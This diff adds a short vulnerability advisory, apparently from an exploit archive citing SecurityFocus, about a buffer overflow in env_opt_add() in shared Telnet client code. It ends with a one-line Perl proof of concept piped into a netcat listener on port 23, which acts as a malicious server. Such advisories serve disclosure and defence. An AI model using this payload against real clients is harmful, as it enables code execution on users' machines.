@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/12919/info
+
+Multiple vendors' Telnet client applications are reported prone to a remote buffer-overflow vulnerability. This vulnerability reportedly occurs in the 'env_opt_add()' function in the 'telnet.c' source file, which is apparently common source for all the affected vendors.
+
+A remote attacker may exploit this vulnerability to execute arbitrary code on some of the affected platforms in the context of a user that is using the vulnerable Telnet client to connect to a malicious server. 
+
+perl -e 'print "\377", "\372\42\3\377\377\3\3" x 43, "\377\360"' | nc -l 23 
